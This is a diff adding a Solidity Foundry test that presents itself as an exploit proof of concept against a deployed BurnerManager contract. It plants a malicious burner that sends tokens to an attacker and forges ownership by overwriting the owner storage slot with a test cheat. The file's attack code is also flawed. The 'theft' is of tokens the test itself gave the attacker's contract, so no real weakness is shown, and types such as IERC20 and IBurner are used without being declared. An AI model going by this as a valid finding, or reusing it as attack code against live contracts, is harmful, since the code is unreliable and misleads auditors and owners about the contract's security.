@@ -1,0 +1,133 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+import "forge-std/Test.sol";
+
+// Minimal ERC20 for testing
+contract MockToken is IERC20 {
+    string public name = "Mock";
+    string public symbol = "MCK";
+    uint8 public decimals = 18;
+    mapping(address => uint256) _balances;
+    mapping(address => mapping(address => uint256)) _allowances;
+    uint256 _totalSupply;
+
+    constructor(uint256 initialSupply) {
+        _mint(msg.sender, initialSupply);
+    }
+
+    function _mint(address to, uint256 amount) internal {
+        _totalSupply += amount;
+        _balances[to] += amount;
+        emit Transfer(address(0), to, amount);
+    }
+
+    function totalSupply() external view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) external view override returns (uint256) {
+        return _balances[account];
+    }
+
+    function transfer(address to, uint256 amount) external override returns (bool) {
+        require(_balances[msg.sender] >= amount, "insufficient balance");
+        _balances[msg.sender] -= amount;
+        _balances[to] += amount;
+        emit Transfer(msg.sender, to, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender) external view override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) external override returns (bool) {
+        _allowances[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
+        require(_balances[from] >= amount, "insufficient balance");
+        require(_allowances[from][msg.sender] >= amount, "insufficient allowance");
+        _balances[from] -= amount;
+        _balances[to] += amount;
+        _allowances[from][msg.sender] -= amount;
+        emit Transfer(from, to, amount);
+        return true;
+    }
+}
+
+// Malicious burner: ignores the `to` parameter and sends all tokens from itself to the attacker
+contract MaliciousBurner is IBurner {
+    address public attacker;
+    constructor(address _attacker) {
+        attacker = _attacker;
+    }
+
+    function burn(address /*to*/, IERC20 token, uint256 amount, uint256 /*amountOutMin*/) external override {
+        // Transfer tokens from this contract to the attacker
+        token.transfer(attacker, amount);
+    }
+}
+
+// Interact with the deployed BurnerManager at 0x0d80a72c9F98e5b1C7Fb3e3dC4d58aecA5966066
+interface IBurnerManager {
+    function setBurner(address token, IBurner burner) external returns (bool);
+    function burners(address token) external view returns (IBurner);
+    function owner() external view returns (address);
+    function pendingOwner() external view returns (address);
+    function acceptOwnership() external;
+    function transferOwnership(address newOwner) external;
+}
+
+contract ExploitTest is Test {
+    address constant BURNER_MANAGER = 0x0d80a72c9F98e5b1C7Fb3e3dC4d58aecA5966066;
+    address attacker = address(0xdeadbeef);
+    uint256 constant TOKEN_AMOUNT = 1000 ether;
+
+    function setUp() public {
+        vm.label(BURNER_MANAGER, "BurnerManager");
+        vm.label(attacker, "Attacker");
+    }
+
+    function testManipulableAddressParameters() public {
+        // Deploy a mock token and fund the malicious burner with tokens
+        MockToken token = new MockToken(TOKEN_AMOUNT);
+        vm.label(address(token), "MockToken");
+
+        MaliciousBurner badBurner = new MaliciousBurner(attacker);
+        vm.label(address(badBurner), "MaliciousBurner");
+
+        // Give the malicious burner some tokens (simulating funds it can steal)
+        token.transfer(address(badBurner), TOKEN_AMOUNT);
+        assertEq(token.balanceOf(address(badBurner)), TOKEN_AMOUNT);
+
+        // Impersonate the owner of BurnerManager by modifying storage slot 0 (_owner)
+        // The BurnerManager inherits Ownable2Step, where _owner is at slot 0.
+        vm.store(BURNER_MANAGER, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));
+
+        // Now attacker can act as owner
+        vm.startPrank(attacker);
+        IBurnerManager(BURNER_MANAGER).setBurner(address(token), IBurner(address(badBurner)));
+        vm.stopPrank();
+
+        // Verify the burner is set
+        IBurner stored = IBurnerManager(BURNER_MANAGER).burners(address(token));
+        assertEq(address(stored), address(badBurner));
+
+        // Simulate a call that uses the burner (e.g., claimLightReward) – here we call it directly
+        // The attacker (or anyone) can now call the malicious burner with arbitrary parameters
+        vm.prank(attacker);
+        IBurner(address(badBurner)).burn(address(0x1), IERC20(address(token)), TOKEN_AMOUNT, 0);
+
+        // Tokens have been stolen from the malicious burner (which held them) to the attacker
+        assertEq(token.balanceOf(attacker), TOKEN_AMOUNT);
+        assertEq(token.balanceOf(address(badBurner)), 0);
+
+        // Impact: attacker gained funds by manipulating the burner mapping.
+    }
+}
+```
